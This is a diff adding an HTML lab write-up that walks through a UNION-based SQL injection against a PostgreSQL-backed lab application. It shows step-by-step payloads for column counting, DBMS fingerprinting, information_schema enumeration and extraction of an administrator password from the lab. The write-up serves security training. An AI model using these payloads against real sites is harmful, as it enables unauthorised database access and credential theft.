@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+```
+<title>SQL Injection — Database Enumeration & Credential Extraction</title>
+
+<style>
+    * {
+        box-sizing: border-box;
+    }
+
+    body {
+        margin: 0;
+        padding: 0;
+        font-family: Arial, Helvetica, sans-serif;
+        line-height: 1.7;
+        color: #1f2937;
+        background: #eef2f7;
+    }
+
+    .container {
+        max-width: 1100px;
+        margin: 0 auto;
+        padding: 40px 20px 70px;
+    }
+
+    /* HERO */
+
+    .hero {
+        background: linear-gradient(135deg, #0f172a, #1e293b);
+        color: white;
+        padding: 50px 45px;
+        border-radius: 18px;
+        margin-bottom: 30px;
+        box-shadow: 0 15px 40px rgba(15, 23, 42, 0.25);
+    }
+
+    .hero .tag {
+        display: inline-block;
+        background: #22c55e;
+        color: #052e16;
+        padding: 6px 12px;
+        border-radius: 20px;
+        font-size: 13px;
+        font-weight: bold;
+        margin-bottom: 15px;
+    }
+
+    .hero h1 {
+        margin: 0 0 15px;
+        font-size: 38px;
+        line-height: 1.2;
+    }
+
+    .hero p {
+        color: #cbd5e1;
+        font-size: 17px;
+        max-width: 850px;
+        margin: 0;
+    }
+
+    /* CARDS */
+
+    .card {
+        background: white;
+        border-radius: 14px;
+        padding: 30px;
+        margin-bottom: 25px;
+        box-shadow: 0 5px 20px rgba(15, 23, 42, 0.08);
+        border: 1px solid #e2e8f0;
+    }
+
+    .card h2 {
+        margin-top: 0;
+    }
+
+    /* GOAL */
+
+    .goal {
+        border-left: 6px solid #6366f1;
+        background: linear-gradient(135deg, #eef2ff, #ffffff);
+    }
+
+    .goal h2 {
+        color: #4338ca;
+    }
+
+    .goal ul {
+        margin-bottom: 0;
+    }
+
+    /* SECTION HEADINGS */
+
+    .section-title {
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        margin-bottom: 20px;
+    }
+
+    .number {
+        width: 42px;
+        height: 42px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: #2563eb;
+        color: white;
+        border-radius: 50%;
+        font-weight: bold;
+        font-size: 18px;
+        flex-shrink: 0;
+    }
+
+    .section-title h2 {
+        margin: 0;
+        color: #111827;
+        font-size: 25px;
+    }
+
+    h3 {
+        color: #334155;
+        margin-top: 28px;
+    }
+
+    /* CODE */
+
+    pre {
+        background: #0b1120;
+        color: #e2e8f0;
+        padding: 20px;
+        border-radius: 10px;
+        overflow-x: auto;
+        border: 1px solid #1e293b;
+        box-shadow: inset 0 0 0 1px rgba(255,255,255,0.02);
+    }
+
+    pre code {
+        background: transparent;
+        color: #e2e8f0;
+        padding: 0;
+        font-family: "Courier New", Consolas, monospace;
+        font-size: 15px;
+    }
+
+    code {
+        background: #e2e8f0;
+        color: #b91c1c;
+        padding: 3px 7px;
+        border-radius: 5px;
+        font-family: "Courier New", Consolas, monospace;
+        font-size: 0.92em;
+    }
+
+    .payload {
+        border-left: 5px solid #ef4444;
+    }
+
+    .payload-label {
+        font-size: 12px;
+        font-weight: bold;
+        color: #dc2626;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        margin-bottom: 8px;
+    }
+
+    /* RESULT */
+
+    .result {
+        background: #ecfdf5;
+        border: 1px solid #86efac;
+        border-left: 6px solid #16a34a;
+        padding: 18px 20px;
+        border-radius: 10px;
+        margin: 20px 0;
+    }
+
+    .result strong {
+        color: #15803d;
+    }
+
+    /* WARNING / NOTE */
+
+    .note {
+        background: #fff7ed;
+        border: 1px solid #fdba74;
+        border-left: 6px solid #f97316;
+        padding: 18px 20px;
+        border-radius: 10px;
+        margin: 20px 0;
+    }
+
+    .note strong {
+        color: #c2410c;
+    }
+
+    /* TABLE */
+
+    table {
+        width: 100%;
+        border-collapse: separate;
+        border-spacing: 0;
+        margin: 25px 0;
+        overflow: hidden;
+        border-radius: 10px;
+        border: 1px solid #cbd5e1;
+    }
+
+    th {
+        background: #1e293b;
+        color: white;
+        padding: 14px;
+        text-align: left;
+    }
+
+    td {
+        padding: 14px;
+        border-top: 1px solid #e2e8f0;
+    }
+
+    tr:nth-child(even) td {
+        background: #f8fafc;
+    }
+
+    /* FINDING */
+
+    .finding {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        background: #dbeafe;
+        color: #1d4ed8;
+        padding: 7px 13px;
+        border-radius: 20px;
+        font-size: 13px;
+        font-weight: bold;
+    }
+
+    /* ATTACK CHAIN */
+
+    .attack-chain {
+        background: #0f172a;
+        color: white;
+        border-radius: 14px;
+        padding: 30px;
+    }
+
+    .attack-chain h2 {
+        color: white;
+    }
+
+    .chain {
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+        margin-top: 20px;
+    }
+
+    .chain-step {
+        background: #1e293b;
+        padding: 14px 18px;
+        border-radius: 8px;
+        border: 1px solid #334155;
+        text-align: center;
+        font-family: "Courier New", monospace;
+    }
+
+    .arrow {
+        text-align: center;
+        color: #22c55e;
+        font-size: 20px;
+        font-weight: bold;
+    }
+
+    /* TAKEAWAYS */
+
+    .takeaway-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+        gap: 15px;
+        margin-top: 20px;
+    }
+
+    .takeaway {
+        background: #f8fafc;
+        border: 1px solid #e2e8f0;
+        padding: 18px;
+        border-radius: 10px;
+    }
+
+    .takeaway strong {
+        color: #1d4ed8;
+        display: block;
+        margin-bottom: 6px;
+    }
+
+    /* FOOTER */
+
+    footer {
+        text-align: center;
+        color: #64748b;
+        font-size: 13px;
+        margin-top: 35px;
+    }
+
+    @media (max-width: 700px) {
+        .hero {
+            padding: 35px 25px;
+        }
+
+        .hero h1 {
+            font-size: 28px;
+        }
+
+        .card {
+            padding: 22px;
+        }
+    }
+</style>
+```
+
+</head>
+
+<body>
+
+<div class="container">
+
+```
+<!-- HERO -->
+
+<section class="hero">
+    <span class="tag">SQL INJECTION LAB</span>
+
+    <h1>Database Enumeration & Credential Extraction</h1>
+
+    <p>
+        A practical investigation of a UNION-based SQL injection vulnerability,
+        from column enumeration and database identification to table discovery,
+        column enumeration and credential extraction.
+    </p>
+</section>
+
+
+<!-- END GOALS -->
+
+<section class="card goal">
+
+    <div class="section-title">
+        <div class="number">✓</div>
+        <h2>End Goals</h2>
+    </div>
+
+    <ul>
+        <li>Determine the table containing usernames and passwords.</li>
+        <li>Determine the relevant username and password columns.</li>
+        <li>Output the contents of the target table.</li>
+        <li>Identify the administrator credentials and use them to complete the lab.</li>
+    </ul>
+
+</section>
+
+
+<!-- STEP 1 -->
+
+<section class="card">
+
+    <div class="section-title">
+        <div class="number">1</div>
+        <h2>Determine the Number of Columns</h2>
+    </div>
+
+    <p>
+        The first step was determining how many columns were returned by the original
+        SQL query. This is important for a UNION-based SQL injection because the
+        injected SELECT statement must return the same number of columns as the
+        original query.
+    </p>
+
+    <p>
+        I started with the <code>ORDER BY</code> technique and incremented the column
+        number until the application returned an error.
+    </p>
+
+    <div class="payload-label">Payload 01</div>
+
+    <pre class="payload"><code>' ORDER BY 1--</code></pre>
+
+    <div class="payload-label">Payload 02</div>
+
+    <pre class="payload"><code>' ORDER BY 2--</code></pre>
+
+    <p>
+        The next iteration produced an error:
+    </p>
+
+    <div class="payload-label">Payload 03 — Error</div>
+
+    <pre class="payload"><code>' ORDER BY 3--</code></pre>
+
+    <div class="result">
+        <strong>Observation:</strong><br>
+        <code>ORDER BY 3</code> generated an error, indicating that the query
+        does not return a third column.
+        Therefore, the original query returns <strong>2 columns</strong>.
+    </div>
+
+
+    <h3>Alternative Method — UNION NULL Testing</h3>
+
+    <p>
+        I also tested the number of columns using <code>UNION SELECT NULL</code>.
+        The number of NULL values can be increased until the UNION query is accepted.
+    </p>
+
+    <pre class="payload"><code>' UNION SELECT NULL--</code></pre>
+
+    <p>
+        After iterating through the number of columns, this payload returned a
+        successful response:
+    </p>
+
+    <pre class="payload"><code>' UNION SELECT NULL, NULL--</code></pre>
+
+    <div class="result">
+        <strong>Result:</strong><br>
+        The application accepts a UNION query containing
+        <strong>2 columns</strong>.
+    </div>
+
+    <div class="note">
+        <strong>Key Lesson:</strong>
+        <code>ORDER BY</code> enumeration and
+        <code>UNION SELECT NULL</code> testing are both useful techniques for
+        determining the number of columns returned by the original query.
+    </div>
+
+</section>
+
+
+<!-- STEP 2 -->
+
+<section class="card">
+
+    <div class="section-title">
+        <div class="number">2</div>
+        <h2>Determine the Datatypes of the Columns</h2>
+    </div>
+
+    <p>
+        After determining that the query returned two columns, the next step was
+        identifying which columns could accept text values.
+    </p>
+
+    <pre class="payload"><code>' UNION SELECT NULL, NULL--</code></pre>
+
+    <div class="result">
+        <strong>Result:</strong><br>
+        Both positions accepted text-compatible values, meaning either column
+        could potentially be used to display extracted database information.
+    </div>
+
+</section>
+
+
+<!-- STEP 3 -->
+
+<section class="card">
+
+    <div class="section-title">
+        <div class="number">3</div>
+        <h2>Identify the Database Management System</h2>
+    </div>
+
+    <p>
+        The next step was identifying the database management system (DBMS).
+        This matters because database enumeration syntax differs between
+        database technologies.
+    </p>
+
+    <h3>Microsoft SQL Server Test</h3>
+
+    <pre class="payload"><code>' UNION SELECT @@version, NULL--</code></pre>
+
+    <p>
+        The expected result for Microsoft SQL Server was not returned,
+        so Microsoft SQL Server was ruled out for this lab.
+    </p>
+
+    <h3>PostgreSQL Test</h3>
+
+    <pre class="payload"><code>' UNION SELECT version(), NULL--</code></pre>
+
+    <div class="result">
+        <strong>Result:</strong><br>
+        The response confirmed that the target database is
+        <strong>PostgreSQL</strong>.
+    </div>
+
+</section>
+
+
+<!-- STEP 4 -->
+
+<section class="card">
+
+    <div class="section-title">
+        <div class="number">4</div>
+        <h2>Enumerate Database Tables</h2>
+    </div>
+
+    <p>
+        After identifying PostgreSQL, I queried
+        <code>information_schema.tables</code> to enumerate table names.
+    </p>
+
+    <pre class="payload"><code>' UNION SELECT table_name, NULL
+```
+
+FROM information_schema.tables--</code></pre>
+
+```
+    <p>
+        The query returned table names available to the database user.
+        One of the relevant tables identified was:
+    </p>
+
+    <pre><code>users_bbwece</code></pre>
+
+    <span class="finding">TABLE IDENTIFIED</span>
+
+    <div class="result">
+        <strong>Finding:</strong><br>
+        <code>users_bbwece</code> appeared to contain user account information.
+    </div>
+
+</section>
+
+
+<!-- STEP 5 -->
+
+<section class="card">
+
+    <div class="section-title">
+        <div class="number">5</div>
+        <h2>Enumerate the Table Columns</h2>
+    </div>
+
+    <p>
+        I then queried <code>information_schema.columns</code> and restricted
+        the result to the identified users table.
+    </p>
+
+    <pre class="payload"><code>' UNION SELECT column_name, NULL
+```
+
+FROM information_schema.columns
+WHERE table_name = 'users_bbwece'--</code></pre>
+
+```
+    <p>
+        The relevant columns returned were:
+    </p>
+
+    <table>
+        <thead>
+            <tr>
+                <th>Purpose</th>
+                <th>Column</th>
+            </tr>
+        </thead>
+
+        <tbody>
+            <tr>
+                <td>Username</td>
+                <td><code>username_srdqvt</code></td>
+            </tr>
+
+            <tr>
+                <td>Password</td>
+                <td><code>password_zpnttm</code></td>
+            </tr>
+        </tbody>
+    </table>
+
+    <div class="result">
+        <strong>Finding:</strong><br>
+        The target table contains separate columns for usernames and passwords.
+    </div>
+
+</section>
+
+
+<!-- STEP 6 -->
+
+<section class="card">
+
+    <div class="section-title">
+        <div class="number">6</div>
+        <h2>Extract the Usernames and Passwords</h2>
+    </div>
+
+    <p>
+        With the table and column names identified, I constructed a UNION query
+        to retrieve the username and password values.
+    </p>
+
+    <pre class="payload"><code>' UNION SELECT username_srdqvt, password_zpnttm
+```
+
+FROM users_bbwece--</code></pre>
+
+```
+    <p>
+        The response displayed the following administrator account:
+    </p>
+
+    <table>
+        <thead>
+            <tr>
+                <th>Username</th>
+                <th>Password</th>
+            </tr>
+        </thead>
+
+        <tbody>
+            <tr>
+                <td><code>administrator</code></td>
+                <td><code>dy6nlbnmn9cfv2h2ip43</code></td>
+            </tr>
+        </tbody>
+    </table>
+
+    <div class="result">
+        <strong>Final Result:</strong><br>
+        The administrator credentials were successfully retrieved from the
+        vulnerable database, completing the database enumeration portion
+        of the lab.
+    </div>
+
+</section>
+
+
+<!-- ATTACK CHAIN -->
+
+<section class="attack-chain">
+
+    <h2>⚡ Final Attack Chain</h2>
+
+    <div class="chain">
+
+        <div class="chain-step">
+            SQL Injection
+        </div>
+
+        <div class="arrow">↓</div>
+
+        <div class="chain-step">
+            Determine Column Count
+        </div>
+
+        <div class="arrow">↓</div>
+
+        <div class="chain-step">
+            Confirm Compatible Datatypes
+        </div>
+
+        <div class="arrow">↓</div>
+
+        <div class="chain-step">
+            Identify PostgreSQL
+        </div>
+
+        <div class="arrow">↓</div>
+
+        <div class="chain-step">
+            Enumerate Database Tables
+        </div>
+
+        <div class="arrow">↓</div>
+
+        <div class="chain-step">
+            Find <strong>users_bbwece</strong>
+        </div>
+
+        <div class="arrow">↓</div>
+
+        <div class="chain-step">
+            Enumerate Columns
+        </div>
+
+        <div class="arrow">↓</div>
+
+        <div class="chain-step">
+            username_srdqvt + password_zpnttm
+        </div>
+
+        <div class="arrow">↓</div>
+
+        <div class="chain-step">
+            Extract Administrator Credentials
+        </div>
+
+    </div>
+
+</section>
+
+
+<!-- KEY TAKEAWAYS -->
+
+<section class="card">
+
+    <div class="section-title">
+        <div class="number">✓</div>
+        <h2>Key Takeaways</h2>
+    </div>
+
+    <div class="takeaway-grid">
+
+        <div class="takeaway">
+            <strong>01 — Column Enumeration</strong>
+            Determine the number of columns before attempting a UNION-based attack.
+        </div>
+
+        <div class="takeaway">
+            <strong>02 — NULL Testing</strong>
+            NULL values are useful for testing UNION column compatibility.
+        </div>
+
+        <div class="takeaway">
+            <strong>03 — DBMS Identification</strong>
+            Identifying the DBMS helps determine the appropriate enumeration syntax.
+        </div>
+
+        <div class="takeaway">
+            <strong>04 — Information Schema</strong>
+            PostgreSQL exposes useful metadata through
+            <code>information_schema</code>.
+        </div>
+
+        <div class="takeaway">
+            <strong>05 — Structured Enumeration</strong>
+            Table discovery should come before attempting to extract useful data.
+        </div>
+
+        <div class="takeaway">
+            <strong>06 — Attack Chain</strong>
+            Each discovery provided the information required for the next step.
+        </div>
+
+    </div>
+
+</section>
+
+
+<footer>
+    SQL Injection Lab Write-up · PostgreSQL · UNION-based SQL Injection
+</footer>
+```
+
+</div>
+
+</body>
+</html>
